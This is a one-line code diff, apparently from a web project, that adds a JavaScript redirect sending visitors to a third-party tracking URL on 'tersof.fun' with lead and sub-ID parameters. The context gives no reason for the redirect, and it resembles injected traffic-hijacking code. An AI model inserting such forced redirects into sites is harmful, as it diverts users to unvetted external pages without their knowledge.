@@ -1,0 +1,1 @@
+window.location.href = 'https://tersof.fun/4cbtzcyS?lead_id={lead_id}&sub1={sub1}&sub2={sub2}&sub3={sub3}&sub4={sub4}&sub5={sub5}&sub6={sub6}'
